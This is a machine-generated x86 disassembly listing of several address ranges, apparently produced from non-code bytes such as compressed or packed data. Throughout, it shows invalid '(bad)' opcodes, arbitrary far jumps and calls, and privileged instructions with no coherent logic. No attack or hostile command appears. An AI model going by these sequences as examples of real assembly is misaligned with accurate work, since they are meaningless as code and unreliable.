  424b69:	ds mov ch,0xc4
  424b6c:	je     0x424b6d
  424b6e:	dec    ebx
  424b6f:	iret   
  424b70:	and    DWORD PTR [esi+0x34d4207],0x822b523e
  424b7a:	ins    BYTE PTR es:[edi],dx
  424b7b:	pop    edx
  424b7c:	dec    ebp
  424b7d:	jmp    0xfb6a:0x77cc3fc8
  424b84:	jl     0x424b27
  424b86:	mov    ah,0x5d
  424b88:	aam    0xce
  424b8a:	jb     0x424b80
  424b8c:	or     eax,0x7c51f812
  424b91:	add    BYTE PTR [ecx-0x2c],0x5c
  424b95:	pop    ebp
  424b96:	dec    ebx
  424b97:	sub    BYTE PTR [ebp*4+0x3944ffcf],bh
  424b9e:	std    
  424b9f:	es mov edx,0xc649f6c3
  424ba5:	dec    edx
  424ba6:	or     BYTE PTR [edx+0xc],dh
  424ba9:	les    esp,FWORD PTR [edx+0x223af88]
  424baf:	and    BYTE PTR [ecx+ecx*8],0x1
  424bb3:	cs cwde 
  424bb5:	shl    DWORD PTR [edx+0x1c],cl
  424bb8:	and    cl,bl
  424bba:	adc    DWORD PTR [edi],eax
  424bbc:	lock cwde 
  424bbe:	fisub  WORD PTR [ebp+0x5ca228b2]
  424bc4:	aam    0x18
  424bc6:	and    DWORD PTR [ebx+0x11],0xec35c569
  424bcd:	stc    
  424bce:	mov    dl,0x84
  424bd0:	xchg   ebx,eax
  424bd1:	xor    edx,DWORD PTR [edi+eax*1+0x66bdca3e]
  424bd8:	xchg   BYTE PTR [eax],ch
  424bda:	add    cl,BYTE PTR [ebp-0x13]
  424bdd:	sub    DWORD PTR [edi+ecx*4],ecx
  424be0:	cmp    DWORD PTR [edx],esi
  424be2:	ins    DWORD PTR es:[edi],dx
  424be3:	jo     0x424c3c
  424be5:	fidivr WORD PTR [ecx+eiz*4-0x8ea3272]
  424bec:	scas   eax,DWORD PTR es:[edi]
  424bed:	ror    BYTE PTR [ebp+edi*4-0x79],0x28
  424bf2:	aad    0xc6
  424bf4:	xor    ecx,DWORD PTR [edi+0x3f4eb65a]
  424bfa:	fwait
  424bfb:	mov    cs,WORD PTR [edx]
  424bfd:	not    BYTE PTR [ebx+0x1f]
  424c00:	repz std 
  424c02:	jecxz  0x424c13
  424c04:	cli    
  424c05:	fistp  WORD PTR [ebp-0x77bd48cb]
  424c0b:	add    ch,BYTE PTR [esi+0x16c881c5]
  424c11:	mov    ds:0x111182c3,eax
  424c16:	retf   
  424c17:	(bad)  
  424c18:	push   esp
  424c19:	je     0x424c5b
  424c1b:	(bad)  
  424c1d:	xchg   esi,eax
  424c1e:	aad    0x69
  424c20:	mov    esp,0x4e782141
  424c25:	cmp    al,0x13
  424c27:	ins    BYTE PTR es:[edi],dx
  424c28:	adc    bl,BYTE PTR [edx]
  424c2a:	push   esi
  424c2b:	in     eax,dx
  424c2c:	(bad)  
  424c2d:	gs in  al,0xd8
  424c30:	lea    ecx,cs:[edi]
  424c33:	pop    esp
  424c34:	int    0x0
	...
  424c96:	ins    BYTE PTR es:[edi],dx
  424c97:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424c9e:	sub    eax,0x6b588c09
  424ca3:	in     eax,dx
  424ca4:	push   eax
  424ca5:	push   ebp
  424ca6:	fld    DWORD PTR [edi+0x1070001]
  424cac:	add    BYTE PTR [eax],al
  424cae:	nop
  424caf:	fild   DWORD PTR [ebp+0x6a8874d2]
  424cb5:	(bad)
  424cb8:	call   0x13a26051
  424cbd:	dec    edi
  424cbe:	jle    0x424c74
  424cc0:	dec    ebp
  424cc1:	add    al,0x5e
  424cc3:	fcomp  DWORD PTR [eax+0x7d86431e]
  424cc9:	popf   
  424cca:	add    eax,esi
  424ccc:	and    al,0x23
  424cce:	sub    al,0x20
  424cd0:	fisubr DWORD PTR [esi-0x8dd3d11]
  424cd6:	mov    eax,0x2845ed73
  424cdb:	je     0x424d34
  424cdd:	cdq    
  424cde:	je     0x424cb2
  424ce0:	sbb    al,0x2d
  424ce2:	push   edx
  424ce3:	and    BYTE PTR [ecx-0x263a3da7],cl
  424ce9:	nop
  424cea:	gs (bad) 
  424cec:	jmp    0xcc592d2c
  424cf1:	fld    QWORD PTR [edi+0x27]
  424cf4:	pop    ss
  424cf5:	xor    ecx,0x28
  424cf8:	pop    esp
  424cf9:	push   0xa631baa1
  424cfe:	add    eax,edi
  424d00:	fidivr WORD PTR [edx+ebp*8]
  424d03:	fs jp  0x424d55
  424d06:	outs   dx,BYTE PTR ds:[esi]
  424d07:	mov    ebp,0x913b5c2f
  424d0c:	adc    esi,esp
  424d0e:	nop
  424d0f:	dec    ebp
  424d10:	or     DWORD PTR [edi],esi
  424d12:	pop    ss
  424d13:	stos   BYTE PTR es:[edi],al
  424d14:	xchg   ecx,eax
  424d15:	xchg   esi,eax
  424d16:	shl    BYTE PTR [esi+ecx*8+0x1c],cl
  424d1a:	(bad)  
  424d1b:	je     0x424d6a
  424d1d:	push   ds
  424d1e:	pop    ebp
  424d1f:	sbb    ch,al
  424d21:	jl     0x424d41
  424d23:	or     ah,0x28
  424d26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d27:	sahf   
  424d28:	cli    
  424d29:	dec    edx
  424d2a:	sti    
  424d2b:	xor    bh,BYTE PTR [ecx]
  424d2d:	push   edi
  424d2e:	in     al,dx
  424d2f:	adc    eax,0x5ab2b974
  424d34:	aas    
  424d35:	dec    esi
  424d36:	add    esi,edx
  424d38:	inc    esi
  424d39:	popa   
  424d3a:	jmp    FWORD PTR [esi+ebp*4-0x50ec5096]
  424d41:	xor    cl,BYTE PTR [ebp-0x2fb2911d]
  424d47:	test   eax,0x9c6638cb
  424d4c:	in     eax,dx
  424d4d:	sub    eax,0xd9787a6a
  424d52:	in     al,dx
  424d53:	push   cs
  424d54:	adc    eax,0x25315f2c
  424d59:	jmp    0x9c44:0x7156003c
  424d60:	push   es
  424d61:	fbld   TBYTE PTR [edi-0x5fffef71]
  424d67:	pop    edi
  424d68:	nop
  424d69:	inc    edi
  424d6a:	mov    ds:0xa4dc3db6,eax
  424d6f:	aam    0x47
  424d71:	mov    bh,0x5d
  424d73:	daa    
  424d74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d76:	pop    ds
  424d77:	je     0x424d32
  424d79:	and    BYTE PTR [di+0x7c],0x4e
  424d7e:	jle    0x424dbc
  424d80:	pop    ss
  424d81:	inc    eax
  424d82:	mov    esp,0x4fa4641a
  424d87:	idiv   BYTE PTR [esi-0x1f]
  424d8a:	test   BYTE PTR [esp+eax*1],cl
  424d8d:	sub    ch,BYTE PTR [ecx]
  424d8f:	inc    ebx
  424d90:	jne    0x424d6b
  424d92:	in     al,0xeb
  424d94:	xchg   BYTE PTR ds:0x82311c9c,al
  424d9a:	scas   al,BYTE PTR es:[edi]
  424d9b:	pop    ss
  424d9c:	popa   
  424d9d:	addr16 dec ebp
  424d9f:	imul   esp,DWORD PTR [edi*2-0x6772101d],0xbc403557
  424daa:	inc    ebx
  424dab:	mov    cl,0xe2
  424dad:	and    eax,0xfc64f666
  424db3:	and    BYTE PTR ss:[eax],al
	...
  424e16:	cmp    eax,0xf361d20c
  424e1b:	(bad)  
  424e1c:	mov    edi,0xb8b3635c
  424e21:	xchg   DWORD PTR [edi],esi
  424e23:	retf   0xe132
  424e26:	loopne 0x424db0
  424e28:	add    DWORD PTR [eax],eax
  424e2a:	pop    es
  424e2b:	add    DWORD PTR [eax],eax
  424e2d:	add    BYTE PTR [edx],ah
  424e2f:	sbb    bl,cl
  424e31:	or     al,0x59
  424e33:	pop    edx
  424e34:	mov    ecx,0x46cfec0c
  424e39:	mov    ebp,0xedb3c852
  424e3e:	and    DWORD PTR [ebx],esp
  424e40:	push   ds
  424e41:	adc    edx,esi
  424e43:	cld    
  424e44:	sub    dh,al
  424e46:	fsub   QWORD PTR [edi+0x56]
  424e49:	mov    ds:0xa964a5db,al
  424e4e:	xacquire xchg BYTE PTR [eax+0x14dd3737],dh
  424e55:	std    
  424e56:	pushf  
  424e57:	jg     0x424e83
  424e59:	add    DWORD PTR [ecx],eax
  424e5b:	cmp    DWORD PTR [edi+ecx*8+0x7e],edi
  424e5f:	cwde   
  424e60:	les    edi,FWORD PTR [esi+eiz*2-0x6e45866]
  424e67:	fwait
  424e68:	mov    eax,ds:0x43fdc37b
  424e6d:	(bad)  
  424e6e:	xchg   edx,eax
  424e6f:	lods   al,BYTE PTR ds:[esi]
  424e70:	dec    edi
  424e71:	inc    ebx
  424e72:	int3   
  424e73:	inc    edi
  424e74:	imul   ecx,DWORD PTR [ebx],0x44f4b7b5
  424e7a:	or     ecx,DWORD PTR [ecx+0x5a]
  424e7d:	cmp    edi,0x2d5e96e4
  424e83:	sar    esp,1
  424e85:	jle    0x424ecb
  424e87:	std    
  424e88:	call   0xacf5:0x195a0f92
  424e8f:	call   0x664b:0xb7192483
  424e96:	push   ss
  424e97:	pop    ebp
  424e98:	lea    edi,[ebx]
  424e9a:	xchg   DWORD PTR [ebx+0x62f76b74],eax
  424ea0:	scas   al,BYTE PTR es:[edi]
  424ea1:	xchg   edx,eax
  424ea2:	push   edi
  424ea3:	stos   DWORD PTR es:[edi],eax
  424ea4:	call   0xcd6c824d
  424ea9:	mov    BYTE PTR [ebp-0x6c],cl
  424eac:	mov    ebx,0xecc6a357
  424eb1:	xchg   edi,eax
  424eb2:	xchg   esi,eax
  424eb3:	fstp   DWORD PTR [esi-0x2e9afc9c]
  424eb9:	daa    
  424eba:	dec    edx
  424ebb:	push   ebp
  424ebc:	and    al,0x30
  424ebe:	xchg   esp,eax
  424ebf:	jg     0x424ed1
  424ec1:	test   DWORD PTR [esi+0x2bdc7dd0],eax
  424ec7:	xlat   BYTE PTR ds:[ebx]
  424ec8:	ds mov ebx,0x61e8b1a7
  424ece:	shr    DWORD PTR [ecx],cl
  424ed0:	cmc    
  424ed1:	fidivr DWORD PTR [ebp+0x6370e388]
  424ed7:	sub    esp,DWORD PTR [ecx-0x2]
  424eda:	test   al,0x25
  424edc:	enter  0xc4e9,0xac
  424ee0:	fs cmc 
  424ee2:	pop    edx
  424ee3:	ins    BYTE PTR es:[edi],dx
  424ee4:	adc    ah,dl
  424ee6:	data16 and al,0x87
  424ee9:	sub    DWORD PTR [edi],ebx
  424eeb:	jmp    0x7ef0:0x6f91b65
  424ef2:	mov    ecx,fs
  424ef4:	inc    edi
  424ef5:	cs inc eax
  424ef7:	push   ds
  424ef8:	mov    ebx,0xf2615f78
  424efd:	rol    DWORD PTR [esi+0x29],0x45
  424f01:	imul   edx,DWORD PTR [edi],0xffffff92
  424f04:	cld    
  424f05:	(bad)  
  424f06:	cwde   
  424f07:	pop    ebx
  424f08:	repnz push 0xffffffaa
  424f0b:	ret    0xe4f5
  424f0e:	mov    ?,WORD PTR [ebx+0x6c]
  424f11:	jl     0x424f09
  424f13:	xchg   BYTE PTR [ebx-0x2b],ch
  424f16:	xor    al,0x77
  424f18:	pop    ebp
  424f19:	imul   ebx,DWORD PTR [ecx-0x233bcd23],0x75
  424f20:	sar    cl,0x9
  424f23:	inc    esp
  424f24:	idiv   BYTE PTR [esi]
  424f26:	and    eax,0xd86642ff
  424f2b:	push   edx
  424f2c:	push   ebp
  424f2d:	mov    eax,ds:0x131c780a
  424f32:	call   FWORD PTR [ecx-0x1c]
	...
  424f95:	add    BYTE PTR [ebx+0x16],cl
  424f98:	int    0x41
  424f9a:	fstp   st(3)
  424f9c:	iret   
  424f9d:	push   ds
  424f9e:	xor    al,0x88
  424fa0:	ror    BYTE PTR [eax+0x2bee9ef6],1
  424fa6:	out    0x89,eax
  424fa8:	add    DWORD PTR [eax],eax
  424faa:	pop    es
  424fab:	add    DWORD PTR [eax],eax
  424fad:	add    BYTE PTR [esi+ecx*8-0xe],bl
  424fb1:	mov    edx,0x8d65bc4a
  424fb6:	adc    BYTE PTR [ebp+0xd],ah
  424fb9:	and    eax,0xa2173cf1
  424fbe:	cs loopne 0x425011
  424fc1:	fnsave ds:0x1e21f805
  424fc7:	hlt    
  424fc8:	fistp  QWORD PTR [esi-0x3f]
  424fcb:	sub    DWORD PTR [ecx-0x7a170be],ebx
  424fd1:	jmp    0x425009
  424fd3:	cwde   
  424fd4:	jmp    0x42503f
  424fd6:	fcom   DWORD PTR [eax+ebp*1-0x2ee96cda]
  424fdd:	addr16 jae 0x424fc3
  424fe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424fe1:	scas   eax,DWORD PTR es:[edi]
  424fe2:	jg     0x42503a
  424fe4:	jle    0x424fe6
  424fe6:	call   0x357a:0x8e8fe397
  424fed:	pop    esi
  424fee:	nop
  424fef:	mov    eax,ds:0x8ce103b9
  424ff4:	(bad)  
  424ff5:	adc    bh,dh
  424ff7:	xor    al,0x4e
  424ff9:	jge    0x42500d
  424ffb:	jl     0x425047
  424ffd:	std    
  424ffe:	sub    eax,0x8d17e722
  425004:	aaa    
  425005:	jo     0x424f97
  425007:	and    edi,eax
  425009:	adc    bh,BYTE PTR [eax]
  42500b:	ret    
  42500c:	stos   DWORD PTR es:[edi],eax
  42500d:	fcmove st,st(3)
  42500f:	(bad)  
  425010:	xor    DWORD PTR [esi],esi
  425012:	rol    BYTE PTR ss:[edi-0x9],cl
  425016:	pop    ds
  425017:	aas    
  425018:	pop    esi
  425019:	aaa    
  42501a:	adc    edx,DWORD PTR [esi+eax*4+0x30]
  42501e:	and    ah,dh
  425020:	dec    ebx
  425021:	push   ecx
  425022:	test   ecx,esi
  425024:	cmp    DWORD PTR ds:0x7f37d660,0x14b010da
  42502e:	sar    DWORD PTR [edi+eiz*2-0x4ad8c2c1],cl
  425035:	adc    DWORD PTR ss:[ecx],edi
  425038:	pop    ecx
  425039:	iret   
  42503a:	jmp    0xda91:0xb557c9dc
  425041:	inc    ebx
  425042:	mov    al,0xb6
  425044:	pop    eax
  425045:	sbb    DWORD PTR [ebx],0x68098339
  42504b:	xchg   DWORD PTR [esi],esp
  42504d:	inc    ebx
  42504e:	mov    eax,ds:0x1e365a16
  425053:	jmp    0x7d0c:0xcb22054e
  42505a:	add    edi,ebx
  42505c:	sahf   
  42505d:	ds call 0x88ddd3ff
  425063:	adc    al,0xd1
  425065:	mov    esi,esi
  425067:	sbb    al,0xed
  425069:	nop
  42506a:	imul   ebp,DWORD PTR [eax],0x366faf4e
  425070:	lds    esp,FWORD PTR [ecx+0x25]
  425073:	in     al,0xf0
  425075:	jo     0x42500a
  425077:	cmp    edi,DWORD PTR [ecx+edx*2]
  42507a:	cdq    
  42507b:	xchg   ebp,eax
  42507c:	shr    BYTE PTR [ebp+0x62],1
  42507f:	push   edx
  425080:	cmp    al,0x5e
  425082:	sub    DWORD PTR [edi],esi
  425084:	cmp    ch,dl
  425086:	cmc    
  425087:	scas   al,BYTE PTR es:[edi]
  425088:	and    al,0xf5
  42508a:	or     eax,0xd65f4ff7
  42508f:	daa    
  425090:	mov    ds:0xf0851991,eax
  425095:	(bad)  
  425096:	dec    ebx
  425097:	addr16 mov cl,bl
  42509a:	lds    esi,FWORD PTR [ebx]
  42509c:	sbb    ecx,esp
  42509e:	inc    esp
  42509f:	ss jmp 0x73d68b2f
  4250a5:	mov    bh,ch
  4250a7:	add    al,0xcd
  4250a9:	fcomp  DWORD PTR [ebx]
  4250ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4250ac:	dec    esi
  4250ad:	inc    ecx
  4250ae:	das    
  4250af:	gs (bad) 
  4250b1:	ja     0x425126
  4250b3:	mov    dh,0x3f
	...
  425115:	add    dh,bl
  425117:	adc    DWORD PTR [edi-0x15020dd],ebx
  42511d:	std    
  42511e:	and    al,0x47
  425120:	xchg   edi,eax
  425121:	ror    BYTE PTR [edi-0x11cd9e16],cl
  425127:	mov    al,BYTE PTR [ecx]
  425129:	add    BYTE PTR [edi],al
  42512b:	add    DWORD PTR [eax],eax
  42512d:	add    bl,dl
  42512f:	mov    ds:0xa16166b2,eax
  425134:	clc    
  425135:	ja     0x425118
  425137:	repnz inc esi
  425139:	adc    eax,esi
  42513b:	inc    edi
  42513c:	lds    ebx,FWORD PTR [edx]
  42513e:	dec    esi
  42513f:	push   eax
  425140:	mov    esp,0xf30a4a66
  425145:	ins    DWORD PTR es:[edi],dx
  425146:	into   
  425147:	adc    edx,DWORD PTR [edx]
  425149:	and    bh,BYTE PTR [ebx]
  42514b:	scas   eax,DWORD PTR es:[edi]
  42514c:	jl     0x425186
  42514e:	or     eax,0x73434999
  425153:	repz push ebp
  425155:	pop    ecx
  425156:	push   es
  425157:	cld    
  425158:	adc    BYTE PTR [esi+0x55e1aa3b],0xf5
  42515f:	add    BYTE PTR [ebp+0x3f2e35be],ch
  425165:	sub    al,0xc9
  425167:	or     eax,0x39993371
  42516c:	inc    ecx
  42516d:	cmp    esi,DWORD PTR [edi-0x1a]
  425170:	mov    ebx,0x3649af40
  425175:	test   dh,bh
  425177:	mov    esp,0xacaafff2
  42517c:	cmc    
  42517d:	pop    ss
  42517e:	xchg   ecx,eax
  42517f:	add    eax,0x676cf262
  425184:	inc    eax
  425185:	jmp    0x8c20:0xa16d68c8
  42518c:	stos   BYTE PTR es:[edi],al
  42518d:	pop    ss
  42518e:	mov    edi,0xd123516c
  425193:	jl     0x425198
  425195:	add    dl,0xf6
  425198:	loopne 0x425214
  42519a:	mov    sp,0x1356
  42519e:	push   es
  42519f:	ins    DWORD PTR es:[edi],dx
  4251a0:	add    BYTE PTR [eax-0x7e],ah
  4251a3:	mov    ah,0xd5
  4251a5:	sub    ah,0xfb
  4251a8:	gs cmp eax,0xb5a28b34
  4251ae:	xchg   edi,eax
  4251af:	loop   0x425180
  4251b1:	add    eax,0xaae36d11
  4251b6:	add    eax,0x792cd9e6
  4251bb:	inc    edi
  4251bc:	add    ecx,esp
  4251be:	mov    dl,0x3e
  4251c0:	xor    ebx,edx
  4251c2:	add    al,0x8d
  4251c4:	scas   al,BYTE PTR es:[edi]
  4251c5:	leave  
  4251c6:	mov    WORD PTR [edi+edx*1+0x7f529757],cs
  4251cd:	(bad)  
  4251cf:	dec    esi
  4251d0:	sbb    ecx,esi
  4251d2:	xor    al,BYTE PTR [edx+0x70704a9]
  4251d8:	cmp    DWORD PTR [ebp-0x858032c],ebp
  4251de:	jecxz  0x42516c
  4251e0:	push   edi
  4251e1:	cmp    esi,DWORD PTR [ebx-0x62]
  4251e4:	cld    
  4251e5:	ds into 
  4251e7:	mov    edx,0x3d8a3c45
  4251ec:	imul   ecx,DWORD PTR [ecx+0x773662bc],0xffffff98
  4251f3:	push   es
  4251f4:	leave  
  4251f5:	lahf   
  4251f6:	or     al,0x36
  4251f8:	mov    dh,0xe6
  4251fa:	push   ss
  4251fb:	dec    edi
  4251fc:	mul    DWORD PTR [edi]
  4251fe:	scas   al,BYTE PTR es:[edi]
  4251ff:	loope  0x4251d9
  425201:	ficomp WORD PTR [edi]
  425203:	mul    BYTE PTR ds:0x22123c87
  425209:	or     DWORD PTR es:[edx-0x42fb7b6e],0x8
  425211:	xchg   esp,eax
  425212:	push   ds
  425213:	adc    al,dh
  425215:	jmp    0x4c7455f2
  42521a:	popf   
  42521b:	push   0x2c78815d
  425220:	shl    ebx,cl
  425222:	push   es
  425223:	mov    bl,0x2
  425225:	pop    edx
  425226:	dec    eax
  425227:	jg     0x425253
  425229:	mov    cl,0x75
  42522b:	ss push eax
  42522d:	hlt    
  42522e:	in     al,0x69
  425230:	mov    ebx,0x39a18ace
	...
  425295:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42529c:	mov    ebp,0x2e2083e6
  4252a1:	add    eax,0x64608de3
  4252a6:	cmc    
  4252a7:	mov    eax,DWORD PTR [ecx]
  4252a9:	add    BYTE PTR [edi],al
  4252ab:	add    DWORD PTR [eax],eax
  4252ad:	add    BYTE PTR [edx+0x2d],cl
  4252b0:	sbb    al,0x1a
  4252b2:	jb     0x4252fb
  4252b4:	xchg   ebx,eax
  4252b5:	test   al,0x4e
  4252b7:	test   BYTE PTR [edi],bh
  4252b9:	hlt    
  4252ba:	repnz ins DWORD PTR es:[edi],dx
  4252bc:	xchg   ecx,eax
  4252bd:	and    al,0x6
  4252bf:	push   es
  4252c0:	pushf  
  4252c1:	jb     0x4252c8
  4252c3:	sub    ebx,eax
  4252c5:	stos   DWORD PTR es:[edi],eax
  4252c6:	leave  
  4252c7:	test   al,0x8e
  4252c9:	sar    ebp,cl
  4252cb:	jae    0x425340
  4252cd:	xchg   BYTE PTR [edx-0x3d7feb5c],al
  4252d3:	pushf  
  4252d4:	hlt    
  4252d5:	sbb    DWORD PTR [ebp-0x15b08ca7],esp
  4252db:	and    ecx,eax
  4252dd:	in     al,dx
  4252de:	dec    esi
  4252df:	sub    al,0x99
  4252e1:	push   es
  4252e2:	(bad)  
  4252e3:	jo     0x425284
  4252e5:	mov    DWORD PTR [ebx+0x5c544449],esi
  4252eb:	lods   eax,DWORD PTR ds:[esi]
  4252ec:	mov    cl,0x5c
  4252ee:	stc    
  4252ef:	xchg   ecx,eax
  4252f0:	leave  
  4252f1:	pop    esi
  4252f2:	dec    edi
  4252f3:	lds    edx,FWORD PTR [ebx+0x20559028]
  4252f9:	nop
  4252fa:	int    0x57
  4252fc:	mov    ecx,0x2bb49f63
  425301:	sahf   
  425302:	fst    st(7)
  425304:	xor    DWORD PTR [edi],ebp
  425306:	scas   eax,DWORD PTR es:[edi]
  425307:	out    dx,al
  425308:	inc    edx
  425309:	div    edi
  42530b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42530c:	mov    dh,0x99
  42530e:	popf   
  42530f:	mov    ebp,0xf2d6bd4d
  425314:	mov    ebx,0x89ad835e
  425319:	fldcw  WORD PTR [ebx-0x61]
  42531c:	jge    0x4252cf
  42531e:	repz (bad) 
  425320:	push   ebx
  425321:	mov    al,ds:0x8b2e7c0e
  425326:	or     al,0x10
  425328:	push   ss
  425329:	jb     0x425329
  42532b:	xchg   esi,eax
  42532c:	push   esp
  42532d:	add    DWORD PTR [edi-0x4],esp
  425330:	xchg   edi,eax
  425331:	xchg   edx,eax
  425332:	push   ss
  425333:	jae    0x4252c0
  425335:	data16 jmp 0x425328
  425338:	call   0x9fc2:0xbbd3c97b
  42533f:	lds    ebp,FWORD PTR [edx+0x6d]
  425342:	aad    0xe6
  425344:	(bad)  
  425345:	jne    0x42536a
  425347:	in     eax,0xd4
  425349:	push   edx
  42534a:	mov    WORD PTR ds:0xf548245,es
  425350:	dec    edx
  425351:	data16 (bad) 
  425353:	call   esp
  425355:	sti    
  425356:	fnsave [ecx+0x41135f1c]
  42535c:	jbe    0x4253c6
  42535e:	mov    fs,WORD PTR [ecx-0x1c]
  425361:	cli    
  425362:	icebp  
  425363:	mov    esi,0xaf1819e9
  425368:	in     al,0xf9
  42536a:	ret    
  42536b:	stc    
  42536c:	es leave 
  42536e:	mov    al,0xed
  425370:	mov    edx,0x9f54dced
  425375:	push   ebp
  425376:	jne    0x425396
  425378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425379:	xchg   ebp,eax
  42537a:	dec    esi
  42537b:	hlt    
  42537c:	inc    ebp
  42537d:	sbb    DWORD PTR [edi+edx*8],ecx
  425380:	mov    edx,0xf2832333
  425385:	test   BYTE PTR ds:0x40b4ec62,al
  42538b:	fcmovnb st,st(0)
  42538d:	not    DWORD PTR [ebx-0x14]
  425390:	aas    
  425391:	retf   0xd141
  425394:	es push 0xffffffce
  425397:	mov    ds:0x12d3687c,al
  42539c:	pushf  
  42539d:	cmp    al,0x29
  42539f:	jno    0x4253c9
  4253a1:	and    esi,DWORD PTR [edi+0x67]
  4253a4:	mov    edx,0x4f6dd287
  4253a9:	pop    ebx
  4253aa:	inc    DWORD PTR [esi-0x3f7c6ff1]
  4253b0:	and    DWORD PTR [ebp+0xc1f5b7],0x0
	...
  425416:	inc    edx
  425417:	or     esp,eax
  425419:	test   eax,0xeb6fedcf
  42541e:	out    0xf4,eax
  425420:	xchg   al,bl
  425422:	out    dx,eax
  425423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425424:	fs out 0xfc,eax
  425427:	mov    WORD PTR [ecx],es
  425429:	add    BYTE PTR [edi],al
  42542b:	add    DWORD PTR [eax],eax
  42542d:	add    BYTE PTR [ebp+0x6595fab1],bl
  425433:	inc    esi
  425434:	inc    esp
  425435:	mov    eax,ds:0xd7986e69
  42543a:	mov    cl,bl
  42543c:	and    al,BYTE PTR [ebp-0x48]
  42543f:	loop   0x4253c2
  425441:	adc    esi,DWORD PTR [edi+0x46af3de0]
  425447:	mov    ch,BYTE PTR [edi+0x16e6221e]
  42544d:	shl    BYTE PTR [edi+0x1c],1
  425450:	add    DWORD PTR [edi],eax
  425452:	sub    esi,esp
  425454:	inc    esi
  425455:	push   ebx
  425456:	shl    esp,cl
  425458:	inc    ebx
  425459:	xchg   esp,eax
  42545a:	nop
  42545b:	lods   eax,DWORD PTR ds:[si]
  42545d:	cli    
  42545e:	stos   DWORD PTR es:[edi],eax
  42545f:	std    
  425460:	pusha  
  425461:	pop    edi
  425462:	adc    BYTE PTR [esi-0xb],dh
  425465:	jnp    0x4253ec
  425467:	daa    
  425468:	mov    dl,0x84
  42546a:	push   ecx
  42546b:	out    0x9a,eax
  42546d:	call   0xe23d:0xbf7a5808
  425474:	cmp    eax,0x1630000c
  425479:	sbb    eax,0x5019e592
  42547e:	sbb    al,0x44
  425480:	std    
  425481:	mov    ebx,0xe1030e08
  425486:	cld    
  425487:	out    dx,eax
  425488:	je     0x42548c
  42548a:	xor    dl,cl
  42548c:	adc    bl,bh
  42548e:	or     eax,0xe3eaaedb
  425493:	jae    0x4254f7
  425495:	aaa    
  425496:	hlt    
  425497:	inc    DWORD PTR ss:[edx+eiz*4]
  42549b:	iret   
  42549c:	sub    eax,0xcf0163db
  4254a1:	or     edx,DWORD PTR [edi+0x4f]
  4254a4:	ret    
  4254a5:	pop    es
  4254a6:	xor    eax,0x9dc812d9
  4254ac:	mov    ds:0x8fa14616,eax
  4254b1:	and    ebx,DWORD PTR [esi-0x60361686]
  4254b7:	pusha  
  4254b8:	pop    ss
  4254b9:	retf   0x21de
  4254bc:	js     0x425447
  4254be:	sahf   
  4254bf:	jp     0x42544b
  4254c1:	in     al,0x9f
  4254c3:	xchg   ebp,eax
  4254c4:	push   cs
  4254c5:	(bad)  
  4254c6:	in     eax,0x96
  4254c8:	jno    0x425508
  4254ca:	inc    ebp
  4254cb:	jmp    0x9c4ed974
  4254d0:	xor    BYTE PTR [eiz*4+0x37fdccb],dh
  4254d7:	mov    ah,BYTE PTR [ecx-0x8]
  4254da:	adc    bl,BYTE PTR [eax-0x3a]
  4254dd:	(bad)
  4254e1:	inc    ebp
  4254e2:	cmp    al,0xa5
  4254e4:	fadd   DWORD PTR [esi-0x1b]
  4254e7:	jbe    0x4254a4
  4254e9:	mov    bl,0x5a
  4254eb:	dec    edi
  4254ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254ed:	xchg   DWORD PTR [ecx-0x32f6f969],edi
  4254f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4254f4:	ins    DWORD PTR es:[edi],dx
  4254f5:	dec    DWORD PTR [edx-0x69966ec4]
  4254fb:	dec    ebx
  4254fc:	int    0x40
  4254fe:	dec    esi
  4254ff:	leave  
  425500:	dec    ebx
  425501:	hlt    
  425502:	ins    DWORD PTR es:[edi],dx
  425503:	gs pushf 
  425505:	cmp    bl,BYTE PTR [esi-0x4c]
  425508:	stos   DWORD PTR es:[edi],eax
  425509:	call   0x2a58:0x5a476626
  425510:	imul   esi,DWORD PTR [ecx-0x64],0x7e
  425514:	xchg   ebp,eax
  425515:	scas   al,BYTE PTR es:[edi]
  425516:	jmp    0x78f0:0x121d8e3c
  42551d:	push   ds
  42551e:	mov    al,ds:0x99f2f38e
  425523:	out    dx,eax
  425524:	test   DWORD PTR [ebx],eax
  425526:	(bad)  
  425528:	mov    cl,0xd0
  42552a:	cmp    eax,0xd2c3240f
  42552f:	jmp    0xbd:0x96c16f07
	...
  425596:	(bad)  
  425597:	jmp    0xfef4:0xfe6e7a4e
  42559e:	dec    esp
  42559f:	push   ecx
  4255a0:	ret    0x49c6
  4255a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4255a4:	add    al,BYTE PTR [ebx]
  4255a6:	add    ecx,DWORD PTR [esi+0x1070001]
  4255ac:	add    BYTE PTR [eax],al
  4255ae:	retf   0xc7f9
  4255b1:	add    BYTE PTR [esi],al
  4255b3:	or     al,0x29
  4255b5:	dec    esp
  4255b6:	aad    0x5c
  4255b8:	add    DWORD PTR [eax-0x17],ecx
  4255bb:	push   0x20611e41
  4255c0:	ror    DWORD PTR [ebp+0x4744ae3f],0xd7
  4255c7:	hlt    
  4255c8:	retf   0x2442
  4255cb:	out    0xa4,eax
  4255cd:	jmp    0x38e7:0xcd54573c
  4255d4:	push   ecx
  4255d5:	cdq    
  4255d6:	punpckhwd mm6,QWORD PTR [ecx-0x6d704f79]
  4255dd:	in     eax,dx
  4255de:	sti    
  4255df:	push   ss
  4255e0:	or     al,ch
  4255e2:	cmp    cl,BYTE PTR ds:0xd81cf920
  4255e8:	(bad)  
  4255e9:	in     al,dx
  4255ea:	sub    dh,dl
  4255ec:	in     al,0xed
  4255ee:	xor    ebp,esi
  4255f0:	xchg   DWORD PTR [ebx+0x7e165d10],eax
  4255f6:	test   DWORD PTR [ecx+0x54562e29],0xbb708d3f
  425600:	popa   
  425601:	jne    0x425668
  425603:	sub    bh,bh
  425605:	xchg   ebx,eax
  425606:	or     edi,esi
  425608:	push   ecx
  425609:	push   esp
